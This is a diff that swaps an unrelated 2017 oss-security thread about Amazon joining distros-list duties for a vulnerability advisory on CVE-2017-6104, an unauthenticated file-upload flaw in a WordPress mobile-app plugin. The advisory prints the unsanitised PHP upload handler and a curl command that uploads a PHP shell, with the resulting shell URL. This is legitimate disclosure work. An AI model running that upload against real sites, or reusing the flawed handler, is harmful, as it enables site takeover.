@@ -1,49 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/14/19
-Message-ID: <CA+aC4kuGaM_rAUk+cPQzUPKnO=WfSJ7eKfqoKHd4GWE=7TYR-A@mail.gmail.com>
-Date: Fri, 14 Jul 2017 12:11:26 -0700
-From: Anthony Liguori <anthony@...emonkey.ws>
-To: oss-security@...ts.openwall.com
-Subject: Re: accepting new members to (linux-)distros lists
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/02/12
+Message-id: <798D4367-AFCB-43FF-A603-F296E7E38ECE@me.com>
+Date: Thu, 02 Mar 2017 13:52:23 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Jul 14, 2017 at 11:23 AM, Solar Designer <solar@...nwall.com> wrote:
-> On Fri, Jul 14, 2017 at 11:09:39AM -0700, Anthony Liguori wrote:
->> We (Amazon Linux) are very happy to fill in whatever gaps are needed.
->>
->> Most of the places where that can be done most effectively already
->> have a primary.  I hate to just sign up to be backup but if we did
->> that, we would track independently to ensure nothing got missed.
->>
->> So maybe backup for administrative tasks 9-13 and then we can be
->> primary for technical task 3?  We already test all of these fixes so
->> responding with a report of the testing we've done is straight forward
->> enough.
->
-> This works.  I've just listed Amazon for those tasks as you suggested.
-> Thank you!
->
-> This leaves administrative task 10 with no primary yet, though:
->
-> 10. Monitor relevant public channels (mailing lists, code repositories,
-> etc.) and inform the reporter and the list in case an issue is made
-> public prematurely (that is, leaks or is independently rediscovered) -
-> primary: vacant, backup: Amazon
->
-> Does this mean Amazon will be taking care of it until we find a primary?
-> Or only in cases when no other distro (visibly) does?
->
-> Ideally, a distro should volunteer to be primary for that task now, so
-> that Amazon wouldn't have to volunteer for more than they offered.
+Title: Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-02-27
+Download Site: https://wordpress.org/plugins/zen-mobile-app-native/
+Vendor: https://profiles.wordpress.org/zendkmobileapp/
+Vendor Notified: 2017-02-27
+Vendor Contact:
+Description: Mobile App WordPress plugin lets you turn your website into a full-featured mobile application in minutes using Mobile App Builder.
+Vulnerability:
+The code in file ./zen-mobile-app-native/server/images.php doesn't require authentication or check that the user is allowed to upload content.
+It also doesn't sanitize the file upload against executable code.
 
-I don't mind making us primary here.  I don't think backup/primary
-really matter for this one the more folks doing this the better.
+<?php
+//header('content-type: text/html; charset=iso-8859-2');
+header('Content-Type: text/html; charset=utf-8');
+header('Access-Control-Allow-Origin: *');
+require_once('function.php');
 
-Regards,
-
-Anthony Liguori
-
->
->> > http://oss-security.openwall.org/wiki/mailing-lists/distros#contributing-back
->
-> Alexander
+if ($_FILES['file']['name']) {
+if (!$_FILES['file']['error']) {
+$name = md5(rand(100, 200));
+$ext = explode('.', $_FILES['file']['name']);
+$filename = $name . '.' . $ext[1];
+$destination = 'images/' . $filename;
+$location = $_FILES["file"]["tmp_name"];
+move_uploaded_file($location, $destination);
+echo $plugin_url.'/server/images/' . $filename;
+}
+else {
+echo $message = 'Ooops! Your upload triggered the following error: '.$_FILES['file']['error'];
+}
+}
+CVE-ID: CVE-2017-6104
+Exploit Code:
+$ curl -F "file=@...r/www/shell.php" "http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native/server/images.php"
+http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native//server/images/8d5e957f297893487bd98fa830fa6413.php
+Advisory: http://www.vapidlabs.com/advisory.php?v=178
